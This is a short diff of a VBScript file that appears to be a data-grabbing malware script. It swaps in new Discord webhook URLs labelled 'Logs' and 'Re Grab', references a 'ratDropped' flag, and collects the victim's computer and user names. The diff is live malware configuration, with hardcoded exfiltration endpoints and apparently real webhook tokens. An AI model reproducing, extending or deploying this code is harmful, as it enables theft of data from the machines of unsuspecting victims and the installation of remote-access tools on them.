@@ -10,8 +10,11 @@ Dim sh, fso, WH, RE_WH, PC, USER, ratDropped
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
-WH = "https://discord.com/api/webhooks/1572026403560357978/n4qVnwrF6-OKw6vRfm73KZNXc-8X3IVSkOgQcfRb35d92LOEujl6OMvBy3GpPWrsXdQN"
-RE_WH = "https://discord.com/api/webhooks/1572026526407467079/KUyJrlGn-BaxdIM4Py18HaoCznPd3rfi411OUUewgpFL9Sfx7JGM7qYRtNtXU3vkHh5r"
+' --- WEBHOOKS ---
+' WH = Logs
+WH = "https://discord.com/api/webhooks/1573904916001456162/rxQeUCo6Rtg8_Xes7efwmybNHPHrl_WiOSWPwEEsqKb3PdbG2gsIQee8nR0plW5WV01F"
+' RE_WH = Re Grab
+RE_WH = "https://discord.com/api/webhooks/1573905019235868795/1h-kB4PA8BOkVaMTWu4TU4Qd89AqPFtXkp9ipslf3GvhrUAjvmskSVfXA7KHJCDp0Lei"
 
 PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
